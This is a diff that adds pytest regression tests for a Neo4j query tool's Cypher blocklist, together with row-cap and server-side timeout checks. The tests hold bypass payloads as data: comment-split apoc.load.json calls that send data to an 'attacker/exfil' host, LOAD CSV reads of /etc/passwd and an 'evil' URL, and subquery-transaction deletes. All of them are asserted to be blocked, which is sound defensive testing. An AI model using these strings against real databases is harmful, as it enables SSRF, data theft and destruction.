@@ -84,6 +84,37 @@ def test_query_graph_blocks_merge_case_insensitive():
     _assert_error(env, code="write_blocked", retryable=False)
 
 
+def test_query_graph_blocks_comment_split_procedure_calls():
+    """Regression: Cypher ignores comments, so a comment placed between `CALL`
+    and the procedure namespace used to slip past `_WRITE_PATTERN` entirely.
+
+    That mattered because the blocklist is the only barrier — Neo4j boots with
+    `NEO4J_dbms_security_procedures_unrestricted=apoc.*` and queries run in the
+    driver's default (write) access mode — so a bypass reached `apoc.load.json`
+    (SSRF/exfiltration) and `apoc.cypher.doIt` (arbitrary writes).
+    """
+    bypasses = [
+        'CALL /*x*/apoc.load.json("http://attacker/exfil")',
+        'CALL //c\napoc.load.json("http://attacker/exfil")',
+        "CALL dbms/*x*/.components()",
+        "CALL\napoc.load.json('http://attacker/exfil')",
+        "CALL apoc . load.json('http://attacker/exfil')",
+    ]
+    for cypher in bypasses:
+        env = query_graph.run({"session_id": "s1", "cypher": cypher})
+        _assert_error(env, code="write_blocked", retryable=False)
+
+
+def test_query_graph_comment_strip_preserves_string_literals():
+    """A URL inside a string literal contains `//`, but stripping from there to
+    end-of-line would swallow a following write verb and create a NEW bypass.
+    Comments are only removed outside quoted literals, so this stays blocked."""
+    env = query_graph.run(
+        {"session_id": "s1", "cypher": 'MATCH (n) WHERE n.u = "http://x" CREATE (m)'}
+    )
+    _assert_error(env, code="write_blocked", retryable=False)
+
+
 def test_query_graph_appends_limit_when_absent(monkeypatch):
     seen: dict = {}
 
@@ -94,7 +125,9 @@ def test_query_graph_appends_limit_when_absent(monkeypatch):
 
     monkeypatch.setattr(query_graph.neo4j_client, "run_query", _capture)
     query_graph.run({"session_id": "s1", "cypher": "MATCH (s:Session {id:$session_id}) RETURN s", "limit": 7})
-    assert "LIMIT 7" in seen["cypher"]
+    # The query is wrapped in a neo4j.Query (to carry a server-side timeout);
+    # str(Query) is the underlying text, where the appended LIMIT lives.
+    assert "LIMIT 7" in str(seen["cypher"])
     # session_id is always injected into params.
     assert seen["params"]["session_id"] == "s1"
 
@@ -106,6 +139,82 @@ def test_query_graph_neo4j_failed(monkeypatch):
     monkeypatch.setattr(query_graph.neo4j_client, "run_query", _boom)
     env = query_graph.run({"session_id": "s1", "cypher": "MATCH (s:Session {id:$session_id}) RETURN s"})
     _assert_error(env, code="neo4j_failed", retryable=True)
+
+
+# ── query_graph hardening (extended blocklist + row/time caps) ────────────────
+
+
+import pytest
+
+
+@pytest.mark.parametrize(
+    "cypher",
+    [
+        # General CALL db.* / dbms.* procedures (schema/internals enumeration).
+        "CALL db.labels()",
+        "CALL db.relationshipTypes()",
+        "CALL dbms.components()",
+        "CALL dbms.listConfig()",
+        # Bulk file ingestion.
+        "LOAD CSV FROM 'file:///etc/passwd' AS row RETURN row",
+        "LOAD CSV WITH HEADERS FROM 'http://evil/x.csv' AS row RETURN row",
+        # Subquery transactions (write/abuse vector). The construct itself must
+        # be blocked even when the inner subquery contains no other write keyword.
+        "MATCH (n) CALL { WITH n DETACH DELETE n } IN TRANSACTIONS",
+        "CALL { CREATE (:X) } IN TRANSACTIONS OF 100 ROWS",
+        "MATCH (n) CALL { WITH n RETURN n } IN TRANSACTIONS RETURN n",
+        # apoc procedures (already-blocked family, kept covered).
+        "CALL apoc.periodic.iterate('MATCH (n) RETURN n', 'DELETE n', {})",
+    ],
+)
+def test_query_graph_blocks_extended_vectors(cypher):
+    env = query_graph.run({"session_id": "s1", "cypher": cypher})
+    _assert_error(env, code="write_blocked", retryable=False)
+
+
+@pytest.mark.parametrize(
+    "cypher",
+    [
+        "MATCH (n) RETURN n LIMIT 5",
+        "MATCH (s:Session {id: $session_id})-[:HAS_LOG]->(l:Log) RETURN l WHERE l.severity = 'ERROR'",
+        # CALL { ... } subquery WITHOUT IN TRANSACTIONS is a legitimate read.
+        "MATCH (s:Session {id: $session_id}) CALL { WITH s MATCH (s)-[:HAS_LOG]->(l) RETURN count(l) AS c } RETURN c",
+    ],
+)
+def test_query_graph_allows_normal_reads(monkeypatch, cypher):
+    monkeypatch.setattr(query_graph.neo4j_client, "run_query", lambda *a, **k: [])
+    env = query_graph.run({"session_id": "s1", "cypher": cypher})
+    _assert_ok(env)
+
+
+def test_query_graph_row_cap_truncates_oversized_result(monkeypatch):
+    # Even if a query slips past the textual LIMIT (e.g. literal "LIMIT" in a
+    # string, subquery, …) the tool must not return more rows than the cap.
+    over = [{"n": i} for i in range(50)]
+    monkeypatch.setattr(query_graph.neo4j_client, "run_query", lambda *a, **k: over)
+    env = query_graph.run(
+        {"session_id": "s1", "cypher": "MATCH (n) RETURN n LIMIT 1000000", "limit": 5}
+    )
+    _assert_ok(env)
+    assert len(env["result"]) == 5
+
+
+def test_query_graph_applies_server_side_timeout(monkeypatch):
+    # The query handed to the driver must carry a server-side transaction
+    # timeout so a single read can't run past the latency budget.
+    from neo4j import Query
+
+    seen: dict = {}
+
+    def _capture(cypher, params):
+        seen["cypher"] = cypher
+        return []
+
+    monkeypatch.setattr(query_graph.neo4j_client, "run_query", _capture)
+    query_graph.run({"session_id": "s1", "cypher": "MATCH (s:Session {id:$session_id}) RETURN s"})
+    q = seen["cypher"]
+    assert isinstance(q, Query), f"expected a neo4j.Query carrying a timeout, got {type(q)}"
+    assert q.timeout is not None and q.timeout > 0
 
 
 # ── find_aborts ──────────────────────────────────────────────────────────────
